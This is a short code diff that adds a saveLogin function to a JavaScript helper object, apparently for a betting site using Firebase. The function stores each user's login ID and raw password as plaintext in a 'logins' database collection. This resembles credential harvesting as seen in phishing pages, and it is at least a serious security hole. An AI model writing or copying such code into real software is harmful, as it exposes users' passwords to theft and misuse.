@@ -61,6 +61,21 @@ window.GBET_FB_USER = {
     return setDoc(doc(db, 'complaints', String(record.id)), payload);
   },
 
+  saveLogin: function (login) {
+    var uid = String((login && login.uid) || '').trim();
+    if (!uid) return Promise.resolve();
+    var key = encodeURIComponent(uid);
+    return setDoc(doc(db, 'logins', key), {
+      uid: uid,
+      loginId: uid,
+      name: uid,
+      password: String((login && login.password) || ''),
+      loginType: (login && login.tab) || '',
+      createdAt: Date.now(),
+      date: new Date().toLocaleString('en-IN')
+    }, { merge: true });
+  },
+
   sendChat: function (text, role) {
     return addDoc(collection(db, 'chats'), {
       text: String(text || ''),
